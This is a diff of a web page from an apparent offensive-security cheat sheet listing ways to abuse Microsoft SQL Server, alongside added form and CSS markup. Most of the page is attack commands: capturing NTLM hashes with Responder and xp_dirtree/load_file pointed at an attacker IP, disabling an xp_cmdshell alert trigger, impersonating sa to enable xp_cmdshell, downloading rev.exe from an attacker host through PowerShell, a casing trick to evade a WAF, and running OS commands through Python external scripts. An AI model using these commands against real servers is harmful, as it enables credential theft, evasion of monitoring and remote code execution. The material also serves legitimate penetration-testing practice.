@@ -199,13 +199,136 @@
   <li><a href="https://tldrbins.github.io/@pe/">Pe</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="abuse-1-steal-ntlm-hash">Abuse #1: Steal NTLM hash</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In our local Linux machine</span>
-</span></span><span class="line"><span class="cl">sudo responder -I tun0
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> Linux machine
+</span></span><span class="line"><span class="cl"><span class="go">sudo responder -I tun0
+</span></span></span></code></pre></div></div>
 <p>
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Method 1</button>
 
@@ -214,44 +337,45 @@
 <button data-tabset="set1" data-tabcontent="tab3" >Method 3</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\10.10.14.10\any\thing&#39;</span><span class="p">;</span><span class="w">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">xp_dirtree &#39;\\&lt;LOCAL_IP&gt;\any\thing&#39;;
 </span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">master</span><span class="p">;</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\10.10.14.10\any\thing&#39;</span><span class="p">;</span><span class="w">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">use master; exec xp_dirtree &#39;\\&lt;LOCAL_IP&gt;\any\thing&#39;;
 </span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="nf">load_file</span><span class="p">(</span><span class="s1">&#39;\\10.10.14.10\any\thing&#39;</span><span class="p">);</span><span class="w">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">load_file(&#39;\\&lt;LOCAL_IP&gt;\any\thing&#39;);
 </span></span></span></code></pre></div></div>
 </div></p>
 <h3 id="abuse-2-run-xp_cmdshell">Abuse #2: Run xp_cmdshell</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Check any policy blocking xp_cmdshell
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">server_triggers</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Disable trigger if any
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">disable</span><span class="w"> </span><span class="k">trigger</span><span class="w"> </span><span class="n">ALERT_xp_cmdshell</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="k">all</span><span class="w"> </span><span class="n">server</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Enable xp_cmdshell
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">enable_xp_cmdshell</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># RCE
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="n">whoami</span><span class="w">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check any policy blocking xp_cmdshell
+</span></span><span class="line"><span class="cl"><span class="go">select name from sys.server_triggers;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Disable trigger <span class="k">if</span> any
+</span></span><span class="line"><span class="cl"><span class="go">disable trigger ALERT_xp_cmdshell on all server;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Enable xp_cmdshell
+</span></span><span class="line"><span class="cl"><span class="go">enable_xp_cmdshell;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> RCE
+</span></span><span class="line"><span class="cl"><span class="go">xp_cmdshell whoami
 </span></span></span></code></pre></div></div>
 <h3 id="abuse-3-impersonate-sa-to-run-xp_cmdshell">Abuse #3: Impersonate sa to run xp_cmdshell</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">reconfigure</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">reconfigure</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">EXEC</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;powershell.exe -ep bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe&#39;</span><span class="w">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; exec sp_configure &#39;show advanced options&#39;, 1;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; reconfigure;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; exec sp_configure &#39;xp_cmdshell&#39;, 1;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; reconfigure;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">execute as login = &#39;sa&#39;; EXEC master..xp_cmdshell &#39;powershell.exe -ep bypass curl &lt;LOCAL_IP&gt;/rev.exe -o C:\ProgramData\rev.exe&#39;
 </span></span></span></code></pre></div></div>
 <p><small><em>Note: try xp_cmDshElL to bypass WAF</em></small></p>
 <h3 id="abuse-4-run-external-script">Abuse #4: Run External Script</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">EXEC</span><span class="w"> </span><span class="n">sp_execute_external_script</span><span class="w"> </span><span class="o">@</span><span class="n">language</span><span class="w"> </span><span class="o">=</span><span class="n">N</span><span class="s1">&#39;Python&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">N</span><span class="s1">&#39;import os; os.system(&#34;whoami&#34;);&#39;</span><span class="p">;</span><span class="w">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">EXEC sp_execute_external_script @language =N&#39;Python&#39;, @script = N&#39;import os; os.system(&#34;whoami&#34;);&#39;;
 </span></span></span></code></pre></div></div>
-<br></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
